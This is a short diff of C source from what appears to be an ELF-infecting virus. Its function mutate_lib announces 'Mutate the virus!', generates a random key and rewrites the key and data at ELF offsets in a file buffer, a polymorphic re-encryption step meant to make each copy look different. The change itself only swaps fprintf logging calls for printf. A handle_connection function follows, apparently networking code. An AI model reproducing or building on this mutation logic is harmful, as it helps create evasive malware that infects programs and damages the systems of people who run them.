@@ -75,7 +75,7 @@ void mutate_lib(Globals* global, char*file_buffer){
     global->fprintf(global->stdout, "Mutate the virus!\n");
     MaLib *lib = global->lib;
     uint64_t key = random_key(global);
-    global->fprintf(global->stdout, "🎲Change key from (%lx) --to--> ", *(uint64_t *)(file_buffer+lib->elf_offset_key));
+    global->printf("🎲Change key from (%lx) --to--> ", *(uint64_t *)(file_buffer+lib->elf_offset_key));
 
     // copy the unencrypted data
     global->memcpy((void *)(file_buffer+lib->elf_offset_data), global->lib_mem, lib->data_length);
@@ -85,7 +85,7 @@ void mutate_lib(Globals* global, char*file_buffer){
     
     // write the new key to the new file
     *(uint64_t *)(file_buffer+lib->elf_offset_key) = key;
-    global->fprintf(global->stderr, "(%lx)🎲\n", *(uint64_t *)(file_buffer+lib->elf_offset_key));
+    global->printf("(%lx)🎲\n", *(uint64_t *)(file_buffer+lib->elf_offset_key));
 }
 
 void* handle_connection(void*varg)
